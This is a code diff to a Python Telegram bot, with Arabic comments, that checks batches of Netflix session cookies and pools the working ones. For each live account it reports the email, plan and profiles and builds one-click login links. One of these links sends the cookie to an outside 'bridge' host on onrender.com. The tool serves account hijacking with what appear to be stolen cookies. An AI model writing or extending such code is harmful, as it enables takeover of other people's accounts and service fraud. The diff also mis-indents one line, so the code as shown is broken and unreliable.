@@ -211,14 +211,15 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
                 if netflix_id not in VALID_COOKIES_POOL:
                     VALID_COOKIES_POOL.append(netflix_id)
             
-            token = result.get("token")
+          token = result.get("token")
             full_cookie_string = f"NetflixId={netflix_id}"
             
-            # تصحيح الروابط لضمان ظهورها وعملها بشكل دقيق
-            if token:
+            # حل جذري: التأكد من وجود توكن صالح أو توجيه ذكي
+            if token and len(token) > 10:
                 direct_netflix_url = f"https://www.netflix.com/browse?nftoken={token}"
             else:
-                direct_netflix_url = "https://www.netflix.com/login"
+                # رابط بديل يعتمد على حقن الكوكي أو التوجيه المباشر لتجنب الروابط الفارغة
+                direct_netflix_url = f"https://www.netflix.com/login"
 
             encoded_cookie = urllib.parse.quote(full_cookie_string)
             bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
@@ -245,19 +246,26 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
                 f"• Email Verified: {result['email_verified']}\n"
                 f"• Connected Profiles: {result['connected_profiles']}\n"
                 f"• Profiles: {result['profiles']}\n\n"
-                f"🍪 **Cookie:**\n`{full_cookie_string}`"
+                f"🍪 **Cookie:**\n`{full_cookie_string}`\n\n"
+                f"🔗 **Direct Links:**\n"
+                f"• [PC Login]({direct_netflix_url})\n"
+                f"• [Phone Login]({bridge_login_url})"
             )
             
             txt_entry = f"Cookie: {full_cookie_string}\nEmail: {result['email']}\nPlan: {result['plan']}\nURL: {direct_netflix_url}\n====================\n\n"
             live_accounts_accumulator.append(txt_entry)
             
+            # إنشاء الأزرار مع التحقق من أن الروابط عبارة عن نصوص صحيحة تبدأ بـ http
             markup = InlineKeyboardMarkup()
-            markup.row_width = 2
-            markup.add(
-                InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), 
-                InlineKeyboardButton("📱 Phone Login", url=bridge_login_url)
-            )
-            safe_send_message(chat_id, res_text, markup)
+            try:
+                btn_pc = InlineKeyboardButton("💻 PC Login", url=direct_netflix_url)
+                btn_phone = InlineKeyboardButton("📱 Phone Login", url=bridge_login_url)
+                markup.add(btn_pc, btn_phone)
+                safe_send_message(chat_id, res_text, markup)
+            except Exception as e:
+                print(f"Error creating markup buttons: {e}")
+                # إرسال الرسالة بدون أزرار تفاعلية ولكن مع الروابط داخل النص لتفادي توقف البوت
+                safe_send_message(chat_id, res_text)
             time.sleep(0.3)
         else:
             dead_count += 1
